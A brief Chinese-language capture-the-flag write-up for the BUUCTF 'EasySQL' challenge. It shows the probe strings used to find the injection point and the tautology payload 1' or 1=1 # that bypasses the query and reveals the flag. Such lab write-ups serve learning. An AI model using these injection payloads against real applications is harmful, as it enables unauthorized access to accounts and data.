# BUUCTF EasySQL1
## 题目描述
![abd6d8089970f80d6130fe900f1d7672.png](../_resources/abd6d8089970f80d6130fe900f1d7672.png)

## 解题思路
尝试常用的sql注入字符串
```sql
1' 
1' #
1' --
1' --+
```
发现`1'`的时候报错，`1' #`的时候不报错，说明注入点在'`'`，尝试输入`1' or 1=1 #` 直接就出答案了
![7cea2f58e9cad813875dc130fa4a37b4.png](../_resources/7cea2f58e9cad813875dc130fa4a37b4.png)